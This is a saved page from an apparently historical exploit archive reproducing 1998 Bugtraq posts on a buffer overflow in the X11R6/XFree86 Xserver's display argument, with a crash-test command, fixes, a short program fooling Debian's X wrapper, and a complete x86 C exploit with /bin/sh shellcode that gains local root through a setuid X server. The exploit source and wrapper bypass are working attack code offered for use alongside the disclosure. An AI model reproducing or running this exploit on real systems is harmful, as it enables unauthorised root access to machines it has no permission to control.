<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0061)http://www.insecure.org/sploits/Xserver.display.overflow.html -->
<HTML><HEAD><TITLE>Xserver overflow in the display command-line argument</TITLE>
<META http-equiv=Content-Type content="text/html; charset=iso-8859-1">
<META content="typical overflow, although this one affects a lot of people." 
name=description>
<META 
content=" This, X, X11R5, X11R6, XDM, XFree86, Xserver, affects, although, argument, based, command, course, display, have, includes, line, lot, non, one, overflow, people, possibly, server, servers, suid, systems, this, typical, use" 
name=keywords>
<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY text=#ffffff vLink=#7f7f7f link=#0b7cff bgColor=#000000>
<TABLE cellSpacing=0 cellPadding=0 width="100%">
  <TBODY>
  <TR>
    <TD align=left><A href="http://www.insecure.org/"><IMG height=90 
      src="Xserver overflow in the display command-line argument_files/Insecurelogo-eye-90x168.gif" 
      width=168 border=0></A> </TD>
    <TD vAlign=bottom align=right><!-- Begin Banner Code --><IFRAME 
      marginWidth=0 marginHeight=0 
      src="Xserver overflow in the display command-line argument_files/pro.pl" 
      frameBorder=0 width=728 scrolling=no 
      height=90>
<SCRIPT LANGUAGE="JavaScript"><!--
random = parseInt(Math.random()*10000)
banner = '<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;'
banner += 'page=' + random + '" >';
banner += '<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?'
banner += 'page=' + random + '" '
banner += ' ALT="Click Here!" BORDER=0></A>'
document.write(banner)
// --></SCRIPT>
<NOSCRIPT>
<A HREF="http://cgi.insecure.org/cgi-bin/pro/pro.pl?banner=NonSSI;page=01">
<IMG SRC="http://cgi.insecure.org/cgi-bin/pro/pro.pl?page=01"
     ALT="Click Here!" BORDER=0></A>
</NOSCRIPT>
</IFRAME><!-- End Banner Code --></TD></TR></TBODY></TABLE>
<CENTER>
<H1><B>Xserver overflow in the display command-line argument</B></H1></CENTER>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Summary</B></TH></TR></TBODY></TABLE>
<TABLE>
  <TBODY>
  <TR>
    <TD vAlign=top><B>Description:</B></TD>
    <TD>typical overflow, although this one affects a lot of people.</TD></TR>
  <TR>
    <TD vAlign=top><B>Author:</B></TD>
    <TD>Pavel Kankovsky &lt;peak@kerberos.troja.mff.cuni.cz&gt;</TD></TR>
  <TR>
    <TD vAlign=top><B>Compromise:</B></TD>
    <TD><FONT color=#ff0000 size=+3>root </FONT>(local)</TD></TR>
  <TR>
    <TD vAlign=top><B>Vulnerable Systems:</B></TD>
    <TD>X11R6 (possibly X11R5) based X servers. This includes XFree86. The 
      servers have to be suid, of course (some systems use XDM and have a 
      non-suid server) </TD></TR>
  <TR>
    <TD vAlign=top><B>Date:</B></TD>
    <TD>13 January 1998 </TD></TR><!-- <TR><TD VALIGN="top"><B>Notes:</B></TD><TD> </TD></TR> --></TBODY></TABLE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>Details</B></TH></TR></TBODY></TABLE><BR><PRE>
Date: Tue, 13 Jan 1998 20:22:02 +0100
From: Pavel Kankovsky &lt;peak@kerberos.troja.mff.cuni.cz&gt;
To: BUGTRAQ@NETSPACE.ORG
Subject: Xserver stack smashed

Summary:

On a system where X11R6-based Xserver (R5 is probably affected too) is
installed setuid or setgid (e.g. typical XFree86 installation has XF86_*
setuid root), local users can exploit a buffer overrun in its code and
gain extra privileges (e.g. root privileges when Xserver is setuid root).


Quick vulnerability check:

X :00000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000000\
00000000000000000000000000000000000000000000000000000000000000000009

(add -nolock for XFree86, change X to whatever name your Xserver has)

Vulnerable Xserver will crash (Segmentation fault).

(Note: machines immunized against stack smashing--e.g. Linux boxes with
Solar Designer's kernel patch--are probably not vulnerable.)


Quick fix:

* remove setuid/setgid bit from all installed Xservers
* use xdm or a safe setuid wrapper to start Xserver


Details:

X11R6.x Xserver recognizes a runtime argument specifying the desired
display (e.g. X :1). It accepts ANY value regardless of its length
and contents (save from the initial colon).

Excerpt from xc/programs/Xserver/os/access.c (X11R6.3)

/* Reset access control list to initial hosts */
void
ResetHosts (display)
    char *display;
{
    register HOST       *host;
    char                lhostname[120], ohostname[120];
    char                *hostname = ohostname;
    char                fname[100];

[snip]

    strcpy (fname, "/etc/X");
    strcat (fname, display);
    strcat (fname, ".hosts");
    if (fd = fopen (fname, "r"))
[snip]

}

Xserver calls ResetHosts() during its startup. A very long value of
"display" (100 + 2*120 + delta bytes) overflows "fname" and corrupts
the stack.

An actual exploit is left as an exercise for the reader. :)

There are probably other vulnerable places in Xserver code. (I have
spotted another buffer overrun in LockServer() (os/utils.c, XFree86
specific) but this one seems to be benign.) Anyone willing to pay me
big bucks for an exhaustive audit is welcome. :)


--Pavel Kankovsky aka Peak (troja.mff.cuni.cz network administration)
          [ Boycott Microsoft -- http://www.vcnet.com/bms ]
</PRE><PRE>
Date: Wed, 21 Jan 1998 21:58:55 +0100
From: Pavel Kankovsky <PEAK@KERBEROS.TROJA.MFF.CUNI.CZ>
To: BUGTRAQ@NETSPACE.ORG
Subject: Re: Xserver stack smashed -- wrapper

On Wed, 21 Jan 1998, John Goerzen wrote:

&gt; A short time ago, there was some talk about various wrappers around
&gt; the X server, and I pointed out that Debian already has one better
&gt; than the example posted.  Since then, I have received requests to post
&gt; Debian's wrapper source.

Unfortunately, this wrapper has two serious flaws:

&gt;   case Console:
&gt;     if (fstat(0,&amp;s)!=0) {
&gt;       fprintf(stderr,"X: cannot stat stdin\n");
&gt;       return FALSE;
&gt;     }
&gt;     if (S_ISCHR(s.st_mode) &amp;&amp; ((s.st_rdev&gt;&gt;8)&amp;0xff)==VT_MAJOR_DEV &amp;&amp;
&gt;         (s.st_rdev&amp;0xff)&lt;128) {
&gt;       return TRUE;
&gt;     }
&gt;     break;

First flaw: it is quite easy to fool this check. In many cases, it is
possible to find a world writable vc entry in /dev (yes, this is a kind
of configuration error but AFAIK Debian itself ships with a load of world
writable /dev/tty[0-9]*'s) and do this:

        int
        main()
        {
                close(0);
                open("/dev/tty0", O_WRONLY);
                execlp("xserver-wrapper", "xserver-wrapper", 0);
        }

IMHO, /var/run/utmp ought to be consulted

&gt;     for (i = 1; i &lt; argc; i++) {
&gt;       if (!strcmp(argv[i], "-config")) {
&gt;         if (setuid(getuid())) {
&gt;           perror("X couldn't drop setuid privileges for alternate config");
&gt;           exit(1);
&gt;         }
&gt;         break;
&gt;       }
&gt;     }
&gt;     execv(xserver,argv);

Second flaw: not paranoid enough when checking the arguments.
It should test whether arguments are _allowed_ and their parameters
have _sane_ values.


--Pavel Kankovsky aka Peak (troja.mff.cuni.cz network administration)
          [ Boycott Microsoft -- http://www.vcnet.com/bms ]


Date: Mon, 26 Jan 1998 18:36:36 +0530
From: Rahul Sahadevan <SRAHUL@CSA.IISC.ERNET.IN>
To: BUGTRAQ@NETSPACE.ORG
Subject: Re: Xserver stack smashed

On Tue, 13 Jan 1998, Pavel Kankovsky wrote:

--------------------------------------------------------------------------
=&gt;On a system where X11R6-based Xserver (R5 is probably affected too) is
=&gt;installed setuid or setgid (e.g. typical XFree86 installation has XF86_*
=&gt;setuid root), local users can exploit a buffer overrun in its code and
=&gt;gain extra privileges (e.g. root privileges when Xserver is setuid root).
=&gt;Quick fix: remove setuid/setgid bit from all installed Xservers
=&gt;* use xdm or a safe setuid wrapper to start Xserver
=&gt;An actual exploit is left as an exercise for the reader. :)
--------------------------------------------------------------------------

Hi,
        Here is an x86 exploit for the recently discovered X-server buffer
overflow. This program has been tested on most XF86 servers ( version 3.2 )
shipped with Redhat-4.2 and on XF86_SVGA( version 3.2 and 3.3.1 ). It did
not work on XF86_SVGA 3.1.x.

        Use a wrapper to check the arguments passed to the X server or use
Solar Designer's kernel stack patch to prevent the overflow,

Disclaimer:
        This program is for educational purposes only. Please do not
misuse it. I cannot be held responsible for any damage caused by the
use of this program by anyone.

Rahul Sahadevan,
Administrator, Dept of CS &amp; A,
Indian Institute of Sciences.

-------------------------8&lt;-------Xploit.c---------------------------------

    /**********************************************************
    * Adapted from                                            *
    *   "Smashing The Stack For Fun And Profit"               *
    *     in Phrack-49 by Aleph One ( aleph1@underground.org )*
    * by                                                      *
    *   Rahul Sahadevan. ( srahul@csa.iisc.ernet.in )         *
    **********************************************************/

/* Try 2 3 4 5 for OFFSET */
#define OFFSET 2

#include <STRING.H>
#include <UNISTD.H>
#include <ERRNO.H>

#define LENCODE ( sizeof( Code ) )
char Code[] =
    "\xeb\x40\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0"
    "\x3f\x89\xc2\x31\xdb\xb3\x0a\x31\xc9\xcd\x80\x89\xd0\x43\x41"
    "\xcd\x80\x89\xd0\x43\x41\xcd\x80\x31\xc0\x89\xc3\xb0\x17\xcd"
    "\x80\x31\xc0\xb0\x2e\xcd\x80\x31\xc0\xb0\x0b\x89\xf3\x8d\x4e"
    "\x08\x8d\x56\x0c\xcd\x80\xe8\xbb\xff\xff\xff/bin/sh";

char Display[ 0x4001 + OFFSET ] = ":99999", *ptr = Display + OFFSET + 1;
char *args[] = { "X", "-nolock", Display, NULL };

main() {
  dup2( 0, 10 ); dup2( 1, 11 ); dup2( 2, 12 );
  __asm__("movl %%esp,(%0)\n\tsubl %1,(%0)"::"b"(ptr),"n"(LENCODE+0x2000));
  memcpy( ptr + 4, ptr, 0x3fc );
  memset( ptr + 0x400, 0x90, 0x3c00 - LENCODE );
  memcpy( ptr + 0x4000 - LENCODE, Code, LENCODE );
  execve( "/usr/X11R6/bin/X", args, args + 3 );
  perror( "execve" );
}

--------------------------------8&lt;-----------------------------------------
</PRE>
<TABLE width="100%">
  <TBODY>
  <TR bgColor=#005f00>
    <TH align=middle><B>More Exploits!</B></TH></TR></TBODY></TABLE><BR>The master 
index of all exploits is available <A 
href="http://www.insecure.org/sploits_all.html">here</A> (Very large file)<BR>Or 
you can pick your favorite operating system:<BR>
<TABLE border=1>
  <TBODY>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_all.html">All OS's</A></TD>
    <TD><A href="http://www.insecure.org/sploits_linux.html">Linux</A></TD>
    <TD><A 
      href="http://www.insecure.org/sploits_solaris.html">Solaris/SunOS</A></TD>
    <TD><A 
    href="http://www.insecure.org/sploits_microshit.html">Micro$oft</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_bsd.html">*BSD</A></TD>
    <TD><A href="http://www.insecure.org/sploits_mac.html">Macintosh</A></TD>
    <TD><A href="http://www.insecure.org/sploits_aix.html">AIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_irix.html">IRIX</A></TD></TR>
  <TR>
    <TD><A href="http://www.insecure.org/sploits_ultrix.html">ULTRIX/Digital 
      UNIX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_hpux.html">HP/UX</A></TD>
    <TD><A href="http://www.insecure.org/sploits_sco.html">SCO</A></TD>
    <TD><A href="http://www.insecure.org/sploits_remote.html">Remote 
      exploits</A></TD></TR></TBODY></TABLE><BR>This page is part of <A 
href="http://www.insecure.org/sploits.html">Fyodor's exploit world</A>. For a 
free program to automate scanning your network for vulnerable hosts and 
services, check out my network mapping tool, <A 
href="http://www.insecure.org/nmap/index.html">nmap</A>. Or try these <A 
href="http://www.insecure.org/">Insecure.Org</A> resouces:<BR><BR>
<CENTER>[ <A href="http://www.insecure.org/nmap/index.html"><FONT 
color=#ffffff>Nmap</FONT></A> | <A 
href="http://www.insecure.org/tools.html"><FONT color=#ffffff>Tools</FONT></A> | 
<A href="http://lists.insecure.org/"><FONT color=#ffffff>Lists</FONT></A> | <A 
href="http://www.insecure.org/reading.html"><FONT 
color=#ffffff>Reading</FONT></A> | <A href="http://www.insecure.org/"><FONT 
color=#ffffff>News</FONT></A> | <A 
href="http://www.insecure.org/myworld.html"><FONT 
color=#ffffff>About/Contact</FONT></A> | <A 
href="http://www.insecure.org/advertising.html"><FONT 
color=#ffffff>Advertising</FONT></A> | <A 
href="http://www.insecure.org/privacy.html"><FONT color=#ffffff>Privacy 
Policy</FONT></A> ]<BR></CENTER></BODY></HTML>
